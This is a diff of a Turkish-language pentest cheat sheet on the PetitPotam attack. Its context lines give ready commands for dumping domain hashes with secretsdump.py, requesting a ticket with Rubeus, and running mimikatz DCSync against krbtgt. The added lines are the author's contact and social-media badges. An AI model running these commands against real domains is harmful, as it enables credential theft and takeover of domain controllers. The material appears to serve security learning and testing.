@@ -18,3 +18,24 @@ Aşağıda PetitPotam saldırısını gerçekleştirmek adına kullanabileceğin
 | `secretsdump.py -just-dc-user target-domain/administrator "TARGET-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | NTLM hash değerlerini NTDS.dit dosyasından çıkarmak | Linux Saldırı Makinası | Domain Controller | DCSync saldırısı ve yakalanan hash değeri kullanılır. |
 | `.\Rubeus.exe asktgt /user:TARGET-DC01$ /<base64 certificate>=/ptt` | Pass-the-ticket saldırısı yapmak | Windows Saldırı Makinası | Domain Controller | Makine hesabı kullanılarak TGT bileti alınır. |
 | `mimikatz # lsadump::dcsync /user:target-domain\krbtgt` | DCSync saldırısı yapmak | Windows Saldırı Makinası | Domain Controller | Mimikatz kullanılarak DCSync saldırısı yapılır. |
+
+
+<div align="center">
+
+## Benimle iletişime geçin! 🚀
+
+[![Instagram](https://img.shields.io/badge/-tunahantekeoglu-E4405F?style=for-the-badge&logo=Instagram&logoColor=white)](https://www.instagram.com/tunahantekeoglu)<br>
+[![Twitter](https://img.shields.io/badge/-tunahantekeoglu-1DA1F2?style=for-the-badge&logo=Twitter&logoColor=white)](https://twitter.com/tunahantekeoglu)<br>
+[![LinkedIn](https://img.shields.io/badge/-tunahantekeoglu-0A66C2?style=for-the-badge&logo=LinkedIn&logoColor=white)](https://www.linkedin.com/in/tunahantekeoglu/?originalSubdomain=tr)<br>
+
+### Ya da Bana Mail Gönderebilirsiniz 📩
+
+[![Email](https://img.shields.io/badge/tunahantekeoglu%40gmail.com-D14836?style=for-the-badge&logo=Gmail&logoColor=white)](mailto:tunahantekeoglu@gmail.com)
+
+## Siber Güvenlik Hakkındaki Yazılarımı Okumak İçin
+
+[![Medium](https://img.shields.io/badge/-tun4hunt-000000?style=for-the-badge&logo=Medium&logoColor=white)](https://medium.com/@tun4hunt)
+
+</div>
+
+---
